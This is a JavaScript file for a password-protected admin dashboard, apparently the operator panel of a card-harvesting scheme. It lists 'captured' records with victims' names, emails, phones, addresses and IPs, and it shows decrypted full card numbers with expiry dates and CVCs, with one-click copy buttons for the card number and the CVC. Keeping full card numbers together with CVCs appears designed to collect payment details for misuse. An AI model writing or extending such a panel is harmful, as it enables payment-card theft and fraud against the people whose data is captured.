const $ = s => document.querySelector(s);
let offset = 0, busy = false, done = false;

const esc = s => String(s ?? '').replace(/[&<>"]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
const when = iso => {
  const d = new Date(iso), m = Math.round((Date.now() - d) / 60000);
  if (m < 1) return 'now';
  if (m < 60) return m + 'm';
  if (m < 1440) return Math.round(m / 60) + 'h';
  return d.toLocaleDateString('nl-NL', { day: '2-digit', month: 'short' });
};

const api = async (qs, opt) => {
  const r = await fetch('/api/admin' + qs, opt);
  if (r.status === 401) { showGate(); throw new Error('unauthorised'); }
  return r;
};

function showGate() { $('#gate').hidden = false; $('#dash').hidden = true; }
function showDash() { $('#gate').hidden = true; $('#dash').hidden = false; load(true); stats(); }

async function stats() {
  try {
    const d = await (await api('?view=stats')).json();
    const pills = [`<span>total <b>${d.total}</b></span>`, `<span>cards <b>${d.cards}</b></span>`];
    (d.byStatus || []).forEach(s => pills.push(`<span>${esc(s.status)} <b>${s.n}</b></span>`));
    $('#stats').innerHTML = pills.join('');
  } catch (_) {}
}

function filters() {
  const p = new URLSearchParams({ view: 'list' });
  if ($('#q').value.trim()) p.set('q', $('#q').value.trim());
  if ($('#status').value) p.set('status', $('#status').value);
  if ($('#days').value) p.set('days', $('#days').value);
  if ($('#cardOnly').checked) p.set('card', '1');
  return p;
}

async function load(reset) {
  if (busy) return;
  busy = true;
  if (reset) { offset = 0; done = false; $('#rows').innerHTML = ''; }
  try {
    const p = filters(); p.set('limit', '50'); p.set('offset', String(offset));
    const { rows } = await (await api('?' + p)).json();
    $('#count').textContent = `${rows.length} shown${done ? '' : ' · more available'}`;
    if (rows.length < 50) done = true;
    $('#more').hidden = done;
    rows.forEach(r => {
      const tr = document.createElement('tr');
      tr.innerHTML = `<td class="mono">${when(r.created_at)}</td>
        <td><span class="pill ${esc(r.status)}">${esc(r.status)}</span></td>
        <td>${esc(r.email || '—')}</td><td>${esc(r.name || '—')}</td>
        <td class="mono">${r.pan_last4 ? '•••• ' + esc(r.pan_last4) : '—'}</td>
        <td class="mono">${r.fields_filled}/7</td>
        <td class="mono">${r.pan_last4 ? '▸' : ''}</td>`;
      tr.onclick = () => detail(r.id);
      $('#rows').appendChild(tr);
    });
    offset += rows.length;
  } catch (_) {} finally { busy = false; }
}

async function detail(id) {
  const d = await (await api('?view=detail&id=' + encodeURIComponent(id))).json();
  const copy = (val) => `<div class="pan"><span>${esc(val)}</span><button class="copy" data-c="${esc(val)}">copy</button></div>`;
  $('#detail').innerHTML = `
    <dl>
      <dt>Status</dt><dd><span class="pill ${esc(d.status)}">${esc(d.status)}</span></dd>
      <dt>When</dt><dd>${new Date(d.created_at).toLocaleString('nl-NL')}</dd>
      <dt>Email</dt><dd>${esc(d.email || '—')}</dd>
      <dt>Name</dt><dd>${esc(d.name || '—')}</dd>
      <dt>Phone</dt><dd>${esc(d.phone || '—')}</dd>
      <dt>Address</dt><dd>${esc(d.address ? [d.address.line1, d.address.city, d.address.postal_code, d.address.country].filter(Boolean).join(', ') : '—')}</dd>
      <dt>IP / Geo</dt><dd class="mono">${esc(d.ip || '—')} · ${esc(d.country || '—')}</dd>
      <dt>Referrer</dt><dd class="mono">${esc(d.referrer || '—')}</dd>
      <dt>Customer</dt><dd class="mono">${esc(d.stripe_customer || '—')}</dd>
      <dt>Subscription</dt><dd class="mono">${esc(d.stripe_sub || '—')}</dd>
      ${d.fail_reason ? `<dt>Failure</dt><dd>${esc(d.fail_reason)}</dd>` : ''}
    </dl>
    ${d.pan_sealed ? `<dl><dt>Card</dt><dd>${d.pan ? copy(d.pan) : '<span style=\'color:#e06c60\'>decrypt failed — PAN_KEY missing or wrong</span>'}</dd>
      <dt>Expiry</dt><dd class="mono">${esc(d.pan_exp || '—')}</dd>
      <dt>CVC</dt><dd>${copy(d.cvc || '—')}</dd></dl>` : '<p style="color:#6f7783">No card captured.</p>'}
    <button class="ad-del" id="delBtn">Delete permanently</button>
    <dl><dt>User agent</dt><dd class="mono" style="font-size:11px">${esc(d.ua || '—')}</dd></dl>`;
  $('#drawer').hidden = false;
  $('#delBtn').onclick = async () => {
    if (!confirm('Delete this capture permanently?')) return;
    const r = await fetch('/api/admin?id=' + encodeURIComponent(id), { method: 'DELETE' });
    if (r.ok) { $('#drawer').hidden = true; load(true); stats(); }
  };
  $('#detail').querySelectorAll('.copy').forEach(b => b.onclick = () => {
    navigator.clipboard.writeText(b.dataset.c);
    b.textContent = 'ok'; setTimeout(() => b.textContent = 'copy', 900);
  });
}

$('#loginForm').onsubmit = async e => {
  e.preventDefault();
  $('#gateErr').textContent = '';
  const r = await fetch('/api/admin-login', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ password: $('#pw').value }),
  });
  const d = await r.json().catch(() => ({}));
  if (!r.ok) { $('#gateErr').textContent = d.error || 'Failed.'; return; }
  $('#pw').value = '';
  showDash();
};

$('#logout').onclick = async () => { await fetch('/api/admin-login', { method: 'DELETE' }); showGate(); };
$('#closeDrawer').onclick = () => { $('#drawer').hidden = true; };
$('#refresh').onclick = () => { load(true); stats(); };
$('#more').onclick = () => load(false);
let qt;
$('#q').addEventListener('input', () => { clearTimeout(qt); qt = setTimeout(() => load(true), 400); });
['#status', '#days', '#cardOnly'].forEach(s => $(s).addEventListener('change', () => load(true)));

(async () => {
  try { (await fetch('/api/admin?view=stats')).ok ? showDash() : showGate(); } catch { showGate(); }
})();
